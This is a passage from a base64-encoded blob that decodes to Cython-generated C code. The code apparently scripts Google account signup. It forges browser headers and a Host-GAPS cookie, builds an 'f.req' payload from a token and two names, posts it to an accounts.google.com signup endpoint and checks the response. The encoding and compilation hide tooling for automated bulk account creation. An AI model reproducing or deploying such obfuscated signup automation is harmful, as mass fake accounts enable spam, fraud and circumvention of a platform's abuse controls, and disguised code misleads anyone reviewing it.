fdl9tYXRjaDtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7XG4gICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICAgIHtcbiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMn07XG4gICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ3JvdXAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA5NCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdl90b2sgPSBfX3B5eF90XzU7XG4gICAgICAgIF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgICAgXG4gICAgICAgIGdvdG8gX19weXhfTDk7XG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgIHtcbiAgICAgICAgX19weXhfdF80ID0gTlVMTDtcbiAgICAgICAgX19weXhfdF84ID0gMTtcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfVG9rZW5fbm90X2ZvdW5kfTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSksIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDk2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9SYWlzZShfX3B5eF90XzUsIDAsIDAsIDApO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QWVhfRVJSKDAsIDk2LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIH1cbiAgICAgIF9fcHl4X0w5OjtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDk3LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9Ib3N0X0dBUFMsIF9fcHl4X3ZfaG9zdCkgPCAoMCkpIF9fUFlYX0VSUigwLCA5NywgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX3B5eF92X2Nvb2tpZXMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzUpO1xuICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoOCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F1dGhvcml0eSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hY2NlcHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgOTgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NlcHRfbGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5fVVNfZW5fcV8wXzkpIDwgKDApKSBfX1BZWF9FUlIoMCwgOTgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9jb250ZW50X3R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGUpIDwgKDApKSBfX1BZWF9FUlIoMCwgOTgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nb29nbGVfYWNjb3VudHNfeHNyZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcmlnaW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbSkgPCAoMCkpIF9fUFlYX0VSUigwLCA5OCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVmZXJlciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX3NpZ251cCkgPCAoMCkpIF9fUFlYX0VSUigwLCA5OCwgX19weXhfTDNfZXJyb3IpXG5cbiAgICAgIFxuICAgICAgX19weXhfdF82ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2diKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgOTksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX3B5eF90XzggPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNykpKSB7XG4gICAgICAgIF9fcHl4X3RfNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNyk7XG4gICAgICAgIGFzc2VydChfX3B5eF90XzYpO1xuICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzcsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNiwgTlVMTH07XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKChQeU9iamVjdCopX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgxLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA5OSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgfVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91c2VyX2FnZW50LCBfX3B5eF90XzQpIDwgKDApKSBfX1BZWF9FUlIoMCwgOTgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX3B5eF92X2hlYWRlcnMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzUpO1xuICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDEwMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3RvaywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEwMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5VW5pY29kZV9Vbmljb2RlKF9fcHl4X3ZfbjEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMDAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShfX3B5eF92X24yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTAwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5VW5pY29kZV9Vbmljb2RlKF9fcHl4X3ZfbjEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTAwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShfX3B5eF92X24yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDEwMCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX3B5eF90XzEyWzBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMztcbiAgICAgIF9fcHl4X3RfMTJbMV0gPSBfX3B5eF90XzQ7XG4gICAgICBfX3B5eF90XzEyWzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNDtcbiAgICAgIF9fcHl4X3RfMTJbM10gPSBfX3B5eF90Xzc7XG4gICAgICBfX3B5eF90XzEyWzRdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNDtcbiAgICAgIF9fcHl4X3RfMTJbNV0gPSBfX3B5eF90XzY7XG4gICAgICBfX3B5eF90XzEyWzZdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNDtcbiAgICAgIF9fcHl4X3RfMTJbN10gPSBfX3B5eF90XzEwO1xuICAgICAgX19weXhfdF8xMls4XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzQ7XG4gICAgICBfX3B5eF90XzEyWzldID0gX19weXhfdF8xMTtcbiAgICAgIF9fcHl4X3RfMTJbMTBdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8wXzBfbnVsbF9udWxsX3dlYl9nbGlmX3NpZ251cF8wO1xuICAgICAgX19weXhfdF8xMyA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMTIsIDExLCAyICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF80KSArIDMgKiA0ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF83KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNikgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEwKSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTEpICsgNDgsIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzQpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNykgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF82KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzEwKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzExKSk7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTMpKSBfX1BZWF9FUlIoMCwgMTAwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEzKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9mX3JlcSwgX19weXhfdF8xMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxMDAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kZXZpY2VpbmZvLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X251bGxfbnVsbF9udWxsX251bGxfbnVsbF9OTF9udWwpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTAwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fcHl4X3ZfZGF0YSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNSk7XG4gICAgICBfX3B5eF90XzUgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTMgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTAyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDEwMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfOCA9IDE7XG4gICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xMCkpKSB7XG4gICAgICAgIF9fcHl4X3RfMTMgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzEwKTtcbiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMTMpO1xuICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTApO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMyk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTAsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgICB9XG4gICAgICAjZW5kaWZcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDMgOiAwKV0gPSB7X19weXhfdF8xMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbn07XG4gICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTAyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb29raWVzLCBfX3B5eF92X2Nvb2tpZXMsIF9fcHl4X3RfMTEsIF9fcHl4X2NhbGxhcmdzKzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMTAyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfdl9oZWFkZXJzLCBfX3B5eF90XzExLCBfX3B5eF9jYWxsYXJncysyLCAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEwMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfZGF0YSwgX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMDIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoKFB5T2JqZWN0KilfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgyLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfMTEpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTAyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICB9XG4gICAgICBfX3B5eF92X3Jlc3BvbnNlID0gX19weXhfdF81O1xuICAgICAgX19weXhfdF81ID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGF0dXNfY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDEwNCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fcHl4X3RfOSA9IChfX1B5eF9QeUxvbmdfQm9vbE5lT2JqQyhfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMDAsIDB4QzgsIDApKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzkgPCAwKSkpIF9fUFlYX0VSUigwLCAxMDQsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBpZiAodW5saWtlbHkoX19weXhfdF85KSkge1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzEwID0gTlVMTDtcbiAgICAgICAgX19weXhfdF84ID0gMTtcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1ZhbGlkYXRpb25fZmFpbGVkfTtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSksIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTA1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9SYWlzZShfX3B5eF90XzUsIDAsIDAsIDApO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QWVhfRVJSKDAsIDEwNSwgX19weXhfTDNfZXJyb3IpXG5cbiAgICAgICAgXG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMCA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxMDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgX19weXhfdF8xMyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NlYXJjaCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxMDYsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDEwNiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX3B5eF90XzggPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTMpKSkge1xuICAgICAgICBfX3B5eF90XzEwID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xMyk7XG4gICAgICAgIGFzc2VydChfX3B5eF90XzEwKTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzEzKTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzEzLCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzggPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X251bGwsIF9fcHl4X3RfMTF9O1xuICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbCgoUHlPYmplY3QqKV9fcHl4X3RfMTMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDMtX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMDYsIF9fcHl4X0wzX2Vycm9y